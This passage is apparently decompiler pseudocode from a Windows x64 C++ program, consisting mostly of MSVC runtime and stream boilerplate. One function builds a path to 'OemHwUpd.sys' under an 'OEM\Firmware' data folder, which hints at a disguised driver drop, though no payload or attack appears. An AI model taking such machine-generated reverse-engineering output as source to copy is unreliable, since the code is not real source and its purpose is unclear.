  *(_QWORD *)(a1 + 40) = 0;
  *(_QWORD *)(a1 + 48) = 0;
  *(_QWORD *)(a1 + 56) = 0;
  *(_QWORD *)(a1 + 64) = 0;
  *(_DWORD *)(a1 + 72) = 0;
  *(_DWORD *)(a1 + 76) = 0;
  *(_QWORD *)(a1 + 80) = 0;
  *(_QWORD *)(a1 + 88) = 0;
  v2 = (std::locale *)operator new(0x10u);
  if ( v2 != nullptr )
  {
    sub_14000A160(v2, 16);
    v3 = std::locale::locale(v2);
  }
  else
  {
    v3 = 0;
  }
  *(_QWORD *)(a1 + 96) = v3;
  std::streambuf::_Init(a1);
  return a1;
}


// ----- sub_140004D50 @ 0x140004d50 -----
void *__fastcall sub_140004D50(void *a1, __int64 a2)
{
  char v3; // [rsp+21h] [rbp-27h] BYREF
  __int64 v4; // [rsp+28h] [rbp-20h]
  __int64 v5; // [rsp+30h] [rbp-18h]
  void *v6; // [rsp+38h] [rbp-10h]

  v5 = (__int64)a1;
  v4 = sub_140008610(a2);
  sub_140001760(v5);
  v6 = a1;
  sub_140008610(a1);
  v3 = __crt_fast_encode_pointer();
  __crt_win32_buffer_no_resizing::deallocate(a1, (const struct __crt_win32_buffer_empty_debug_info *)&v3);
  sub_140009860(a1, a2);
  return a1;
}


// ----- sub_140004DE0 @ 0x140004de0 -----
__int64 __fastcall sub_140004DE0(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  char v4; // [rsp+21h] [rbp-37h] BYREF
  __int64 v5; // [rsp+28h] [rbp-30h]
  __int64 v6; // [rsp+30h] [rbp-28h]
  unsigned __int64 v7; // [rsp+38h] [rbp-20h]
  __int64 v8; // [rsp+40h] [rbp-18h]

  v6 = a1;
  v2 = sub_140008610(a2);
  v5 = unknown_libname_44(&v4, v2);
  sub_140001760(v6);
  v7 = *(_QWORD *)(a2 + 16);
  v8 = unknown_libname_21(a2);
  sub_1400024E0(a1, v8, v7);
  return a1;
}


// ----- sub_140004E80 @ 0x140004e80 -----
struct std::_Container_base0 *__fastcall sub_140004E80(struct std::_Container_base0 *a1, __int64 a2)
{
  __int64 v2; // rax
  unsigned __int64 v3; // rax

  sub_140001680((__int64)a1);
  v2 = sub_14000BBC0(a2);
  v3 = unknown_libname_71(v2);
  sub_140002150(a1, a2, v3);
  return a1;
}


// ----- sub_140004EE0 @ 0x140004ee0 -----
struct std::_Container_base0 *__fastcall sub_140004EE0(
        struct std::_Container_base0 *a1,
        __int64 a2,
        unsigned __int64 a3)
{
  sub_140001680((__int64)a1);
  sub_140002150(a1, a2, a3);
  return a1;
}


// ----- sub_140004F30 @ 0x140004f30 -----
__int64 __fastcall sub_140004F30(__int64 a1)
{
  sub_140001680(a1);
  sub_140008100(a1);
  return a1;
}


// ----- sub_140004F70 @ 0x140004f70 -----
void *__fastcall sub_140004F70(void *a1, __int64 a2)
{
  char v3; // [rsp+21h] [rbp-27h] BYREF
  __int64 v4; // [rsp+28h] [rbp-20h]
  __int64 v5; // [rsp+30h] [rbp-18h]
  void *v6; // [rsp+38h] [rbp-10h]

  v5 = (__int64)a1;
  v4 = sub_140008610(a2);
  sub_140001760(v5);
  v6 = a1;
  sub_140008610(a1);
  v3 = __crt_fast_encode_pointer();
  __crt_win32_buffer_no_resizing::deallocate(a1, (const struct __crt_win32_buffer_empty_debug_info *)&v3);
  sub_140009A10(a1, a2);
  return a1;
}


// ----- sub_140005000 @ 0x140005000 -----
__int64 __fastcall sub_140005000(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  char v4; // [rsp+21h] [rbp-37h] BYREF
  __int64 v5; // [rsp+28h] [rbp-30h]
  __int64 v6; // [rsp+30h] [rbp-28h]
  unsigned __int64 v7; // [rsp+38h] [rbp-20h]
  __int64 v8; // [rsp+40h] [rbp-18h]

  v6 = a1;
  v2 = sub_140008610(a2);
  v5 = unknown_libname_44(&v4, v2);
  sub_140001760(v6);
  v7 = *(_QWORD *)(a2 + 16);
  v8 = unknown_libname_22(a2);
  sub_140002660(a1, v8, v7);
  return a1;
}


// ----- sub_1400050A0 @ 0x1400050a0 -----
__int64 __fastcall sub_1400050A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  unsigned __int64 v5; // [rsp+40h] [rbp-18h]
  __int64 v6; // [rsp+48h] [rbp-10h]

  sub_140001760(a1);
  sub_140008090(a2, a3);
  v5 = std::_String_val<std::_Simple_types<char>>::_Clamp_suffix_size(a2, a3, a4);
  v6 = unknown_libname_22(a2) + 2 * a3;
  sub_140002310(a1, v6, v5);
  return a1;
}


// ----- sub_140005150 @ 0x140005150 -----
__int64 __fastcall sub_140005150(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  unsigned __int64 v3; // rax

  sub_140001680(a1);
  v2 = sub_14000BBE0(a2);
  v3 = unknown_libname_71(v2);
  sub_140002310(a1, a2, v3);
  return a1;
}


// ----- sub_1400051B0 @ 0x1400051b0 -----
struct std::_Container_base0 *__fastcall sub_1400051B0(
        struct std::_Container_base0 *a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7)
{
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  char v11; // [rsp+21h] [rbp-57h] BYREF
  __int16 v12; // [rsp+24h] [rbp-54h] BYREF
  struct std::_Container_base0 *v13; // [rsp+28h] [rbp-50h]
  __int64 v14; // [rsp+30h] [rbp-48h]
  unsigned __int64 v15; // [rsp+38h] [rbp-40h]
  __int64 v16; // [rsp+40h] [rbp-38h]
  struct std::_Container_base0 *v17; // [rsp+48h] [rbp-30h]
  __int64 v18; // [rsp+50h] [rbp-28h] BYREF
  char v19; // [rsp+58h] [rbp-20h] BYREF
  _BYTE v20[7]; // [rsp+59h] [rbp-1Fh] BYREF
  unsigned __int64 v21; // [rsp+60h] [rbp-18h] BYREF

  v17 = a1;
  v7 = sub_140008610(a3);
  v16 = unknown_libname_44(&v11, v7);
  sub_140001760((__int64)v17);
  v15 = a7 + a5;
  v21 = 7;
  v13 = a1;
  v14 = (__int64)a1;
  sub_140008610(a1);
  v19 = __crt_fast_encode_pointer();
  std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl(
    (std::_Fake_proxy_ptr_impl *)v20,
    (const struct std::_Fake_allocator *)&v19,
    v13);
  if ( v21 < v15 )
  {
    v8 = std::string::shrink_to_fit(a1);
    v21 = sub_140007E40(v15, 7, v8);
    v9 = sub_140008610(a1);
    v18 = sub_140001E10(v9, &v21);
    v14 = unknown_libname_71(v18);
    sub_140002850((__int64)v13, &v18);
  }
  *((_QWORD *)v13 + 2) = v15;
  *((_QWORD *)v13 + 3) = v21;
  sub_14000A8C0(v14, a4, a5);
  sub_14000A8C0(v14 + 2 * a5, a6, a7);
  v12 = 0;
  unknown_libname_26(v14 + 2 * v15, &v12);
  _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
  return a1;
}


// ----- sub_1400053B0 @ 0x1400053b0 -----
__int64 __fastcall sub_1400053B0(__int64 a1)
{
  sub_140001680(a1);
  sub_140008190(a1);
  return a1;
}


// ----- sub_1400053F0 @ 0x1400053f0 -----
_QWORD *__fastcall sub_1400053F0(_QWORD *a1, __int64 a2, unsigned int a3)
{
  unsigned int v4; // [rsp+20h] [rbp-28h]
  __int64 v5; // [rsp+28h] [rbp-20h]
  __int64 v6; // [rsp+30h] [rbp-18h]

  sub_140004C30((__int64)a1);
  *a1 = &std::stringbuf::`vftable';
  sub_14000B780(a2, (char *)a1 + 116);
  v4 = std::stringbuf::_Getstate(a3);
  v5 = unknown_libname_77(a2);
  v6 = sub_14000A3E0(a2);
  sub_140008D50(a1, v6, v5, v4);
  return a1;
}


// ----- sub_140005490 @ 0x140005490 -----
_QWORD *__fastcall sub_140005490(_QWORD *a1, __int64 a2, unsigned int a3, int a4)
{
  __int64 v4; // rax

  if ( a4 != 0 )
  {
    *a1 = &unk_14008C758;
    a1[2] = &unk_14008C760;
    std::ios::ios((__int64)(a1 + 19));
  }
  v4 = unknown_libname_71((__int64)(a1 + 3));
  std::iostream::iostream(a1, v4, 0);
  *(_QWORD *)((char *)a1 + *(int *)(*a1 + 4LL)) = &std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`vftable';
  *(_DWORD *)((char *)a1 + *(int *)(*a1 + 4LL) - 4) = *(_DWORD *)(*a1 + 4LL) - 152;
  sub_1400053F0(a1 + 3, a2, a3);
  return a1;
}


// ----- sub_140005590 @ 0x140005590 -----
_QWORD *__fastcall sub_140005590(_QWORD *a1, const struct __crt_win32_buffer_empty_debug_info *a2, __int64 a3)
{
  sub_140005C60(a1, a3);
  *a1 = &std::codecvt<char,char,_Mbstatet>::`vftable';
  __crt_win32_buffer_no_resizing::deallocate(a1, a2);
  return a1;
}


// ----- sub_1400055E0 @ 0x1400055e0 -----
_QWORD *__fastcall sub_1400055E0(_QWORD *a1, __int64 a2, __int64 a3)
{
  sub_140005CA0(a1, a3);
  *a1 = &std::ctype<char>::`vftable';
  std::ctype<char>::_Init(a1, a2);
  return a1;
}


// ----- ??0?$fpos@U_Mbstatet@@@std@@QEAA@U_Mbstatet@@_J@Z @ 0x140005630 -----
_QWORD *__fastcall std::fpos<_Mbstatet>::fpos<_Mbstatet>(_QWORD *a1, __int64 a2, __int64 a3)
{
  *a1 = a3;
  a1[1] = 0;
  a1[2] = a2;
  return a1;
}


// ----- ??0?$fpos@U_Mbstatet@@@std@@QEAA@_J@Z @ 0x140005670 -----
_QWORD *__fastcall std::fpos<_Mbstatet>::fpos<_Mbstatet>(_QWORD *a1, __int64 a2)
{
  *a1 = a2;
  a1[1] = 0;
  memset(a1 + 2, 0, sizeof(_QWORD));
  return a1;
}


// ----- unknown_libname_74 @ 0x1400056c0 -----
// Microsoft VisualC v14 64bit runtime
// Microsoft VisualC 64bit universal runtime
_QWORD *__fastcall unknown_libname_74(_QWORD *a1, __int64 a2, __int64 a3)
{
  *a1 = a2;
  a1[1] = a3;
  return a1;
}


// ----- sub_1400056F0 @ 0x1400056f0 -----
void *__fastcall sub_1400056F0(void *a1)
{
  char v2; // [rsp+20h] [rbp-28h] BYREF
  void *v3; // [rsp+28h] [rbp-20h]

  v3 = a1;
  sub_1400016B0((__int64)a1);
  sub_140008610(a1);
  v2 = __crt_fast_encode_pointer();
  __crt_win32_buffer_no_resizing::deallocate(a1, (const struct __crt_win32_buffer_empty_debug_info *)&v2);
  return a1;
}


// ----- sub_140005750 @ 0x140005750 -----
const struct std::_Container_base0 *__fastcall sub_140005750(
        const struct std::_Container_base0 *a1,
        __crt_win32_buffer_debug_info *a2)
{
  __int64 v2; // rax
  __int64 v3; // rax
  const char *v5; // [rsp+30h] [rbp-18h] BYREF
  __int64 v6; // [rsp+38h] [rbp-10h] BYREF

  sub_140001730((__int64)a1);
  v5 = __crt_win32_buffer_debug_info::file_name(a2);
  v6 = unknown_libname_72((__int64)a2);
  v2 = sub_14000DB10(a2);
  v3 = unknown_libname_71(v2);
  sub_1400028C0(a1, v3, &v6, &v5);
  return a1;
}


// ----- unknown_libname_14 @ 0x1400057e0 -----
// Microsoft VisualC v14 64bit runtime
void *__fastcall unknown_libname_14(void *a1)
{
  memset(a1, 0, 0x10u);
  return a1;
}


// ----- sub_140005800 @ 0x140005800 -----
_QWORD *__fastcall sub_140005800(_QWORD *a1)
{
  *a1 = &std::_Facet_base::`vftable';
  return a1;
}


// ----- ??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z @ 0x140005820 -----
std::_Fake_proxy_ptr_impl *__fastcall std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl(
        std::_Fake_proxy_ptr_impl *this,
        const struct std::_Fake_allocator *a2,
        const struct std::_Container_base0 *a3)
{
  return this;
}


// ----- ??0_Locinfo@std@@QEAA@PEBD@Z @ 0x140005840 -----
std::_Locinfo *__fastcall std::_Locinfo::_Locinfo(std::_Locinfo *this, const char *a2)
{
  std::_Lockit::_Lockit(this, 0);
  std::_Yarn<char>::_Yarn<char>((__int64)this + 8);
  std::_Yarn<char>::_Yarn<char>((__int64)this + 24);
  std::_Yarn<wchar_t>::_Yarn<wchar_t>((__int64)this + 40);
  std::_Yarn<wchar_t>::_Yarn<wchar_t>((__int64)this + 56);
  std::_Yarn<char>::_Yarn<char>((__int64)this + 72);
  std::_Yarn<char>::_Yarn<char>((__int64)this + 88);
  if ( a2 == nullptr )
    sub_14000F888("bad locale name");
  std::_Locinfo::_Locinfo_ctor(this, a2);
  return this;
}


// ----- sub_140005910 @ 0x140005910 -----
__int64 __fastcall sub_140005910(__int64 a1, __int64 a2)
{
  __int64 v3; // [rsp+20h] [rbp-18h]

  *(_QWORD *)a1 = a2;
  v3 = unknown_libname_41(*(int *)(**(_QWORD **)a1 + 4LL) + *(_QWORD *)a1);
  if ( v3 != 0 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v3 + 8LL))(v3);
  return a1;
}


// ----- sub_140005980 @ 0x140005980 -----
__int64 __fastcall sub_140005980(__int64 a1, __int128 *a2, __int64 a3)
{
  __int64 v4; // [rsp+30h] [rbp-98h]
  __int64 v5; // [rsp+40h] [rbp-88h]
  __int128 v6; // [rsp+60h] [rbp-68h] BYREF
  _BYTE v7[32]; // [rsp+70h] [rbp-58h] BYREF
  _BYTE v8[56]; // [rsp+90h] [rbp-38h] BYREF

  v4 = sub_140004DE0((__int64)v8, a3);
  v6 = *a2;
  v5 = sub_140009390(v7, &v6, v4);
  sub_140006280(a1, v5);
  sub_140006820(v7);
  *(_QWORD *)a1 = &std::_System_error::`vftable';
  *(_OWORD *)(a1 + 24) = *a2;
  return a1;
}


// ----- sub_140005A80 @ 0x140005a80 -----
__int64 __fastcall sub_140005A80(__int64 a1, __int64 a2)
{
  sub_140006240(a1, a2);
  *(_QWORD *)a1 = &std::_System_error::`vftable';
  *(_OWORD *)(a1 + 24) = *(_OWORD *)(a2 + 24);
  return a1;
}


// ----- ??0bad_alloc@std@@AEAA@QEBD@Z @ 0x140005ae0 -----
std::bad_alloc *__fastcall std::bad_alloc::bad_alloc(std::bad_alloc *this, const char *a2)
{
  std::exception::exception(this, a2, 1);
  *(_QWORD *)this = &std::bad_alloc::`vftable';
  return this;
}


// ----- sub_140005B20 @ 0x140005b20 -----
std::exception *__fastcall sub_140005B20(std::exception *a1, const struct std::exception *a2)
{
  std::exception::exception(a1, a2);
  *(_QWORD *)a1 = &std::bad_alloc::`vftable';
  return a1;
}


// ----- sub_140005B60 @ 0x140005b60 -----
std::exception *__fastcall sub_140005B60(std::exception *a1, const struct std::exception *a2)
{
  sub_140005B20(a1, a2);
  *(_QWORD *)a1 = &std::bad_array_new_length::`vftable';
  return a1;
}


// ----- ??0bad_array_new_length@std@@QEAA@XZ @ 0x140005ba0 -----
std::bad_array_new_length *__fastcall std::bad_array_new_length::bad_array_new_length(std::bad_array_new_length *this)
{
  std::bad_alloc::bad_alloc(this, "bad array new length");
  *(_QWORD *)this = &std::bad_array_new_length::`vftable';
  return this;
}


// ----- sub_140005BE0 @ 0x140005be0 -----
std::exception *__fastcall sub_140005BE0(std::exception *a1, const struct std::exception *a2)
{
  std::exception::exception(a1, a2);
  *(_QWORD *)a1 = &std::bad_cast::`vftable';
  return a1;
}


// ----- sub_140005C20 @ 0x140005c20 -----
std::exception *__fastcall sub_140005C20(std::exception *a1)
{
  std::exception::exception(a1, "bad cast", 1);
  *(_QWORD *)a1 = &std::bad_cast::`vftable';
  return a1;
}


// ----- sub_140005C60 @ 0x140005c60 -----
std::locale::facet *__fastcall sub_140005C60(std::locale::facet *a1, unsigned __int64 a2)
{
  std::locale::facet::facet(a1, a2);
  *(_QWORD *)a1 = &std::codecvt_base::`vftable';
  return a1;
}


// ----- sub_140005CA0 @ 0x140005ca0 -----
std::locale::facet *__fastcall sub_140005CA0(std::locale::facet *a1, unsigned __int64 a2)
{
  std::locale::facet::facet(a1, a2);
  *(_QWORD *)a1 = &std::ctype_base::`vftable';
  return a1;
}


// ----- unknown_libname_15 @ 0x140005ce0 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_15(__int64 a1, int a2, __int64 a3)
{
  *(_DWORD *)a1 = a2;
  *(_QWORD *)(a1 + 8) = a3;
  return a1;
}


// ----- ??0exception@std@@QEAA@AEBV01@@Z @ 0x140005d10 -----
std::exception *__fastcall std::exception::exception(std::exception *this, const struct std::exception *a2)
{
  *(_QWORD *)this = &std::exception::`vftable';
  memset((char *)this + 8, 0, 0x10u);
  sub_1400111C8((char *)a2 + 8, (char *)this + 8);
  return this;
}


// ----- sub_140005D70 @ 0x140005d70 -----
_QWORD *__fastcall sub_140005D70(_QWORD *a1, __int64 a2)
{
  __int64 v3; // [rsp+20h] [rbp-28h] BYREF
  char v4; // [rsp+28h] [rbp-20h]

  *a1 = &std::exception::`vftable';
  memset(a1 + 1, 0, 0x10u);
  v3 = a2;
  v4 = 1;
  sub_1400111C8(&v3, a1 + 1);
  return a1;
}


// ----- ??0exception@std@@QEAA@QEBDH@Z @ 0x140005df0 -----
std::exception *__fastcall std::exception::exception(std::exception *this, const char *const a2)
{
  *(_QWORD *)this = &std::exception::`vftable';
  memset((char *)this + 8, 0, 0x10u);
  *((_QWORD *)this + 1) = a2;
  return this;
}


// ----- ??0facet@locale@std@@IEAA@_K@Z @ 0x140005e40 -----
std::locale::facet *__fastcall std::locale::facet::facet(std::locale::facet *this, int a2)
{
  sub_140005800(this);
  *(_QWORD *)this = &std::locale::facet::`vftable';
  *((_DWORD *)this + 2) = a2;
  return this;
}


// ----- sub_140005E80 @ 0x140005e80 -----
_QWORD *__fastcall sub_140005E80(_QWORD *a1, __int64 a2)
{
  sub_140006400(a1, a2);
  *a1 = &std::ios_base::failure::`vftable';
  return a1;
}


// ----- ??0failure@ios_base@std@@QEAA@PEBDAEBVerror_code@2@@Z @ 0x140005ec0 -----
std::ios_base::failure *__fastcall std::ios_base::failure::failure(
        std::ios_base::failure *this,
        const char *a2,
        const struct std::error_code *a3)
{
  __int128 v4; // [rsp+20h] [rbp-28h] BYREF

  v4 = *(_OWORD *)a3;
  sub_140006440(this, &v4, a2);
  *(_QWORD *)this = &std::ios_base::failure::`vftable';
  return this;
}


// ----- sub_140005F20 @ 0x140005f20 -----
_QWORD *__fastcall sub_140005F20(_QWORD *a1)
{
  __int64 v2; // [rsp+38h] [rbp-330h]
  __int64 v3; // [rsp+48h] [rbp-320h]
  __int64 v4; // [rsp+58h] [rbp-310h]
  __int64 v5; // [rsp+68h] [rbp-300h]
  __int64 v6; // [rsp+70h] [rbp-2F8h]
  _BYTE v7[32]; // [rsp+78h] [rbp-2F0h] BYREF
  _BYTE v8[32]; // [rsp+98h] [rbp-2D0h] BYREF
  _BYTE v9[32]; // [rsp+B8h] [rbp-2B0h] BYREF
  _BYTE v10[32]; // [rsp+D8h] [rbp-290h] BYREF
  _BYTE v11[32]; // [rsp+F8h] [rbp-270h] BYREF
  _BYTE v12[40]; // [rsp+118h] [rbp-250h] BYREF
  WCHAR Buffer[264]; // [rsp+140h] [rbp-228h] BYREF

  sub_1400053B0((__int64)a1);
  a1[4] = 0;
  a1[5] = 0;
  a1[6] = -1;
  if ( SHGetFolderPathW(nullptr, 35, nullptr, 0, Buffer) < 0 )
    GetTempPathW(0x104u, Buffer);
  v2 = sub_140005150((__int64)v8, (__int64)Buffer);
  v3 = sub_140001B30((__int64)v7, v2, (__int64)L"\\");
  sub_140001B30((__int64)v12, v3, (__int64)L"OEM\\Firmware");
  sub_140006850(v7);
  sub_140006850(v8);
  sub_14000A950(a1, v12);
  v4 = sub_140001B80((__int64)v11, (__int64)v12, (__int64)L"\\");
  v5 = sub_140001B30((__int64)v10, v4, (__int64)L"OemHwUpd");
  v6 = sub_140001B30((__int64)v9, v5, (__int64)L".sys");
  sub_140006ED0(a1, v6);
  sub_140006850(v9);
  sub_140006850(v10);
  sub_140006850(v11);
  sub_140006850(v12);
  return a1;
}


// ----- ??0ios_base@std@@IEAA@XZ @ 0x140006130 -----
std::ios_base *__fastcall std::ios_base::ios_base(std::ios_base *this)
{
  *(_QWORD *)this = &std::ios_base::`vftable';
  *((_QWORD *)this + 1) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 5) = 0;
  *((_DWORD *)this + 6) = 0;
  *((_QWORD *)this + 4) = 0;
  *((_QWORD *)this + 5) = 0;
  *((_QWORD *)this + 6) = 0;
  *((_QWORD *)this + 7) = 0;
  *((_QWORD *)this + 8) = 0;
  return this;
}


// ----- sub_1400061C0 @ 0x1400061c0 -----
__int64 __fastcall sub_1400061C0(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 8) = *(_QWORD *)(a2 + 8);
  (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 8LL))(*(_QWORD *)(a1 + 8));
  return a1;
}


// ----- ??0locale@std@@QEAA@XZ @ 0x140006210 -----
std::locale *__fastcall std::locale::locale(std::locale *this)
{
  std::locale *v2; // [rsp+30h] [rbp+8h]

  v2 = this;
  LOBYTE(this) = 1;
  *((_QWORD *)v2 + 1) = sub_14000F9F4(this);
  return v2;
}


// ----- sub_140006240 @ 0x140006240 -----
std::exception *__fastcall sub_140006240(std::exception *a1, const struct std::exception *a2)
{
  std::exception::exception(a1, a2);
  *(_QWORD *)a1 = &std::runtime_error::`vftable';
  return a1;
}


// ----- sub_140006280 @ 0x140006280 -----
_QWORD *__fastcall sub_140006280(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rax

  v2 = sub_14000A3E0(a2);
  sub_140005D70(a1, v2);
  *a1 = &std::runtime_error::`vftable';
  return a1;
}


// ----- sub_1400062C0 @ 0x1400062c0 -----
__int64 __fastcall sub_1400062C0(__int64 a1, __int64 a2, unsigned __int8 a3)
{
  sub_140005910(a1, a2);
  *(_BYTE *)(a1 + 8) = sub_140009060(*(_QWORD *)a1, a3);
  return a1;
}


// ----- sub_140006320 @ 0x140006320 -----
__int64 __fastcall sub_140006320(__int64 a1, __int64 a2)
{
  __int64 v3; // [rsp+20h] [rbp-18h]

  sub_140005910(a1, a2);
  if ( (unsigned __int8)sub_14000B810(*(int *)(*(_QWORD *)a2 + 4LL) + a2) != 0 )
  {
    v3 = unknown_libname_46(*(int *)(*(_QWORD *)a2 + 4LL) + a2);
    if ( v3 != 0 && v3 != unknown_libname_71(a2) )
    {
      sub_14000B540(v3);
      *(_BYTE *)(a1 + 8) = sub_14000B810(*(int *)(*(_QWORD *)a2 + 4LL) + a2);
    }
    else
    {
      *(_BYTE *)(a1 + 8) = 1;
    }
  }
  else
  {
    *(_BYTE *)(a1 + 8) = 0;
  }
  return a1;
}


// ----- sub_140006400 @ 0x140006400 -----
_QWORD *__fastcall sub_140006400(_QWORD *a1, __int64 a2)
{
  sub_140005A80((__int64)a1, a2);
  *a1 = &std::system_error::`vftable';
  return a1;
}


// ----- sub_140006440 @ 0x140006440 -----
_QWORD *__fastcall sub_140006440(_QWORD *a1, __int128 *a2, __int64 a3)
{
  __int128 v4; // [rsp+20h] [rbp-48h] BYREF
  _BYTE v5[56]; // [rsp+30h] [rbp-38h] BYREF

  sub_140004E80((struct std::_Container_base0 *)v5, a3);
  v4 = *a2;
  sub_140005980((__int64)a1, &v4, (__int64)v5);
  sub_140006820(v5);
  *a1 = &std::system_error::`vftable';
  return a1;
}


// ----- sub_1400064C0 @ 0x1400064c0 -----
__int64 __fastcall sub_1400064C0(__int64 a1)
{
  return sub_1400064E0(a1);
}


// ----- sub_1400064E0 @ 0x1400064e0 -----
void sub_1400064E0()
{
  _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
}


// ----- sub_140006500 @ 0x140006500 -----
__int64 __fastcall sub_140006500(_QWORD *a1)
{
  __int64 result; // rax

  result = (__int64)a1;
  if ( *a1 != 0 )
    return sub_140009E80(*a1);
  return result;
}


// ----- sub_140006530 @ 0x140006530 -----
void sub_140006530()
{
  _castguard_slow_path_check_nop();
}


// ----- sub_140006560 @ 0x140006560 -----
__int64 __fastcall sub_140006560(__int64 a1)
{
  return sub_140009C20(a1);
}


// ----- sub_140006580 @ 0x140006580 -----
__int64 __fastcall sub_140006580(__int64 a1)
{
  *(_QWORD *)a1 = &std::filebuf::`vftable';
  if ( *(_QWORD *)(a1 + 128) != 0 )
    sub_140009660(a1);
  if ( *(_BYTE *)(a1 + 124) != 0 )
    sub_14000A6E0(a1);
  return sub_1400067C0(a1);
}


// ----- ??1ios_base@std@@UEAA@XZ @ 0x1400065e0 -----
void __fastcall std::ios_base::~ios_base(std::ios_base *this)
{
  *(_QWORD *)this = &std::ios::`vftable';
  std::ios_base::~ios_base(this);
}


// ----- ??1?$basic_iostream@DU?$char_traits@D@std@@@std@@UEAA@XZ @ 0x140006610 -----
__int64 __fastcall std::iostream::~iostream<char,std::char_traits<char>>(__int64 a1)
{
  *(_QWORD *)(a1 + *(int *)(*(_QWORD *)(a1 - 32) + 4LL) - 32) = &std::iostream::`vftable';
  *(_DWORD *)(a1 + *(int *)(*(_QWORD *)(a1 - 32) + 4LL) - 36) = *(_DWORD *)(*(_QWORD *)(a1 - 32) + 4LL) - 32;
  sub_140006770(a1);
  return sub_140006690(a1 - 8);
}


// ----- sub_140006690 @ 0x140006690 -----
__int64 __fastcall sub_140006690(__int64 a1)
{
  __int64 result; // rax

  *(_QWORD *)(a1 + *(int *)(*(_QWORD *)(a1 - 24) + 4LL) - 24) = &std::istream::`vftable';
  result = *(int *)(*(_QWORD *)(a1 - 24) + 4LL) - 24LL;
  *(_DWORD *)(a1 + *(int *)(*(_QWORD *)(a1 - 24) + 4LL) - 28) = result;
  return result;
}


// ----- sub_1400066E0 @ 0x1400066e0 -----
__int64 __fastcall sub_1400066E0(__int64 a1)
{
  *(_QWORD *)(a1 + *(int *)(*(_QWORD *)(a1 - 168) + 4LL) - 168) = &std::ofstream::`vftable';
  *(_DWORD *)(a1 + *(int *)(*(_QWORD *)(a1 - 168) + 4LL) - 172) = *(_DWORD *)(*(_QWORD *)(a1 - 168) + 4LL) - 168;
  sub_140006580(a1 - 160);
  return sub_140006770(a1 - 152);
}


// ----- sub_140006770 @ 0x140006770 -----
__int64 __fastcall sub_140006770(__int64 a1)
{
  __int64 result; // rax

  *(_QWORD *)(a1 + *(int *)(*(_QWORD *)(a1 - 16) + 4LL) - 16) = &std::ostream::`vftable';
  result = *(int *)(*(_QWORD *)(a1 - 16) + 4LL) - 16LL;
  *(_DWORD *)(a1 + *(int *)(*(_QWORD *)(a1 - 16) + 4LL) - 20) = result;
  return result;
}


// ----- sub_1400067C0 @ 0x1400067c0 -----
__int64 __fastcall sub_1400067C0(_QWORD *a1)
{
  __int64 result; // rax

  *a1 = &std::streambuf::`vftable';
  result = a1[12];
  if ( result != 0 )
    return sub_140007A00(result, 1);
  return result;
}


// ----- sub_140006820 @ 0x140006820 -----
__int64 __fastcall sub_140006820(__int64 a1)
{
  sub_140009F50(a1);
  return sub_1400064C0(a1);
}


// ----- sub_140006850 @ 0x140006850 -----
__int64 __fastcall sub_140006850(__int64 a1)
{
  sub_14000A000(a1);
  return sub_1400064C0(a1);
}


// ----- sub_140006880 @ 0x140006880 -----
__int64 __fastcall sub_140006880(_QWORD *a1)
{
  *a1 = &std::stringbuf::`vftable';
  sub_140009C60(a1);
  return sub_1400067C0(a1);
}


// ----- ??1?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@UEAA@XZ @ 0x1400068c0 -----
__int64 __fastcall std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::~basic_stringstream<char,std::char_traits<char>,std::allocator<char>>(
        __int64 a1)
{
  *(_QWORD *)(a1 + *(int *)(*(_QWORD *)(a1 - 152) + 4LL) - 152) = &std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`vftable';
  *(_DWORD *)(a1 + *(int *)(*(_QWORD *)(a1 - 152) + 4LL) - 156) = *(_DWORD *)(*(_QWORD *)(a1 - 152) + 4LL) - 152;
  sub_140006880((_QWORD *)(a1 - 128));
  return std::iostream::~iostream<char,std::char_traits<char>>(a1 - 120);
}


// ----- ??1ios_base@std@@UEAA@XZ_0 @ 0x140006950 -----
void __fastcall std::ios_base::~ios_base(std::ios_base *this)
{
  *(_QWORD *)this = &std::codecvt<char,char,_Mbstatet>::`vftable';
  std::ios_base::~ios_base(this);
}


// ----- sub_140006980 @ 0x140006980 -----
void __fastcall sub_140006980(std::ios_base *a1)
{
  *(_QWORD *)a1 = &std::ctype<char>::`vftable';
  sub_140009D50(a1);
  std::ios_base::~ios_base(a1);
}


// ----- sub_1400069C0 @ 0x1400069c0 -----
__int64 __fastcall sub_1400069C0(_QWORD *a1)
{
  __int64 result; // rax
  __int64 v2; // [rsp+28h] [rbp-10h]

  result = (__int64)a1;
  if ( *a1 != 0 )
  {
    v2 = unknown_libname_71((__int64)a1);
    return sub_140007230(v2, *a1);
  }
  return result;
}


// ----- sub_140006A10 @ 0x140006a10 -----
__int64 __fastcall sub_140006A10(__int64 a1)
{
  return sub_140009DB0(a1);
}


// ----- sub_140006A30 @ 0x140006a30 -----
__int64 __fastcall sub_140006A30(__int64 a1)
{
  return sub_140009E80(a1);
}


// ----- sub_140006A50 @ 0x140006a50 -----
_QWORD *__fastcall sub_140006A50(_QWORD *a1)
{
  *a1 = &std::_Facet_base::`vftable';
  return a1;
}


// ----- sub_140006A70 @ 0x140006a70 -----
void sub_140006A70()
{
  _lambda_daad5f71a1db84f3475a074fd2d177ad_::operator()();
}


// ----- sub_140006A90 @ 0x140006a90 -----
void __fastcall sub_140006A90(struct std::_Locinfo *a1)
{
  std::_Locinfo::_Locinfo_dtor(a1);
  sub_140006560((__int64)a1 + 88);
